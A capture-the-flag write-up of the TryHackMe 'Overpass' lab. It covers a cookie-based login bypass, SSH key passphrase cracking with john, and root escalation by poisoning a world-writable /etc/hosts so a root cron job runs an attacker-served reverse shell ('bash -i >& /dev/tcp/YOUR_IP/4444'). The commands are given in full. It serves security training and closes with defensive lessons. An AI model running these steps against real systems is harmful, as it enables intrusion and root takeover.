# Overpass — TryHackMe Writeup

**Room:** https://tryhackme.com/room/overpass
**Difficulty:** Easy
**Category:** JavaScript Auth Bypass · Cookie Manipulation · SSH Key Cracking · Cron Job Hijacking · /etc/hosts Poisoning

> *"What happens when some CS students make a password manager?"*

---

## Flags

| Flag | Value |
|------|-------|
| user.txt | `THM{█████████████████████████████████████████}` |
| root.txt | `THM{█████████████████████████████████████████}` |

---

## 1. Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oN nmap/initial 10.10.228.4

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http    Golang net/http server
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports: SSH on 22 and an HTTP server on 80 built with Go.

---

## 2. Web Enumeration

The homepage advertises **Overpass** — a password manager whose source code, compiled binaries, and build script are available for download. The About page includes humorous backstory about the project.

Directory scan:

```bash
gobuster dir -u http://10.10.228.4/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -o gobuster.log
```

```
/img         (Status: 301)
/downloads   (Status: 301)
/aboutus     (Status: 301)
/admin       (Status: 301)
/css         (Status: 301)
```

`/admin` is the key finding — a login page.

---

## 3. Admin Login — JavaScript Authentication Bypass

Visiting `/admin` shows a basic login form. Common credential pairs fail. Opening the page source reveals three JavaScript files being loaded. The most important is `login.js`:

```javascript
async function login() {
    const usernameBox = document.querySelector('#username');
    const passwordBox = document.querySelector('#password');
    const loginStatus = document.querySelector('#loginStatus');
    loginStatus.textContent = ''
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken", statusOrCookie)
        window.location = "/admin"
    }
}
```

The logic is clear:
- On failed login → display "Incorrect Credentials"
- On success → set a cookie named `SessionToken` with the returned value and redirect to `/admin`

There is **no server-side session validation** — the page just checks whether the `SessionToken` cookie exists. If we manually set that cookie to any non-empty value, the page will treat us as authenticated.

### Cookie Injection via Browser DevTools

Open the browser's developer tools (Firefox: `F12` → Storage → Cookies), then:

1. Add a new cookie: **Name** = `SessionToken`, **Value** = `anything`
2. Reload `/admin`

The page loads the admin panel, displaying an RSA private SSH key alongside a note:

```
Since you keep forgetting your password, James, I've
set up SSH key auth for you. If you forget your password again,
I will seriously consider hitting you.

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA...
...
-----END RSA PRIVATE KEY-----
```

**Username found:** `james`

Save the private key to a file named `id_rsa`.

---

## 4. Cracking the SSH Key Passphrase

The key is passphrase-protected. Convert it to a crackable hash with `ssh2john`, then crack with John:

```bash
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status

james13          (id_rsa)
```

**SSH key passphrase:** `james13`

---

## 5. SSH Access & User Flag

```bash
chmod 600 id_rsa
ssh -i id_rsa james@10.10.228.4
Enter passphrase for key 'id_rsa': james13

james@overpass-prod:~$
```

```bash
james@overpass-prod:~$ cat user.txt
```

**user.txt:** `THM{█████████████████████████████████████████}`

---

## 6. Enumeration — World-Writable `/etc/hosts` and Cron Job

Standard privesc checks — sudo -l requires a password we don't have. Check the system-wide crontab:

```bash
james@overpass-prod:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# ...
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

Every minute, **root** runs `curl` to fetch `buildscript.sh` from `overpass.thm` and pipes it directly into `bash`. This means whoever controls `overpass.thm` controls what runs as root.

Check if `/etc/hosts` is writable:

```bash
james@overpass-prod:~$ ls -la /etc/hosts
-rw-rw-rw- 1 root root 250 Jul 21  2020 /etc/hosts
```

`/etc/hosts` is **world-writable** — a critical misconfiguration. The cron job resolves `overpass.thm` using this file.

```bash
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
127.0.0.1 overpass.thm
```

Currently `overpass.thm` points to `127.0.0.1` (localhost). Changing it to our attacker IP redirects the cron's `curl` request to our machine.

---

## 7. Privilege Escalation — /etc/hosts Poisoning + Fake buildscript

### Step 1 — Create the Malicious Script

On the attacker machine, create the directory structure the cron job expects and populate it with a reverse shell:

```bash
mkdir -p downloads/src
cat > downloads/src/buildscript.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
EOF
```

### Step 2 — Serve It via Python HTTP Server

The cron job fetches from `overpass.thm/downloads/src/buildscript.sh`, so the HTTP server must serve files from the directory containing `downloads/`:

```bash
python3 -m http.server 80
```

### Step 3 — Poison /etc/hosts

On the target, replace the `overpass.thm` entry with the attacker IP:

```bash
james@overpass-prod:~$ sed -i 's/127.0.0.1 overpass.thm/YOUR_IP overpass.thm/' /etc/hosts
james@overpass-prod:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 overpass-prod
YOUR_IP overpass.thm
```

### Step 4 — Catch the Shell

Start the listener:

```bash
nc -lnvp 4444
```

Wait up to one minute for the cron job to fire:

```
connect to [YOUR_IP] from overpass-prod [10.10.228.4] 54108
bash: cannot set terminal process group (1683): ...
root@overpass-prod:~#
```

Root shell obtained. Grab the flag:

```bash
root@overpass-prod:~# cat /root/root.txt
```

**root.txt:** `THM{█████████████████████████████████████████}`

---

## Key Learnings

- **Client-side authentication in JavaScript is never secure** — `login.js` checked the cookie value on the client but the server never validated the session. Any authentication logic in JavaScript is bypassable by simply setting the expected cookie in DevTools. Authentication must always be enforced server-side.
- **Exposing SSH private keys through an admin panel is a critical secret leak** — the entire point of SSH key authentication is that the private key never leaves the owner's machine. Storing it in a web-accessible admin panel defeats this entirely.
- **`ssh2john` + `john` + `rockyou.txt` cracks most weak key passphrases** — passphrase-protected private keys are not unconditionally safe. Common passwords or short passphrases fall quickly to dictionary attacks.
- **`| bash` in a cron job is an attack surface** — any cron job that downloads a script and pipes it to `bash` trusts the source completely. If the DNS resolution for that source can be manipulated, the attacker controls the script.
- **World-writable `/etc/hosts` + cron = trivial root** — `/etc/hosts` should never be world-writable. Combined with a root cron that fetches scripts by hostname, it creates a one-step privilege escalation: change the IP entry, serve a shell, wait one minute.
- **`python3 -m http.server 80` must be run from the correct working directory** — the cron fetches `/downloads/src/buildscript.sh` from the server root. Running the HTTP server from the directory _containing_ `downloads/` is what makes the path resolve correctly.

## Conclusion

Overpass chains together three distinct weaknesses into a clean attack path: a JavaScript authentication bypass that requires zero exploitation skill, an SSH key cracking step that reinforces the importance of strong passphrases, and a cron job / DNS poisoning privilege escalation that is elegant in its simplicity. The root privesc is particularly memorable — the attack doesn't require any exploit, just the ability to edit a file that should have been locked down. The room is a strong illustration of how infrastructure misconfigurations rather than application vulnerabilities can be the critical path to root.
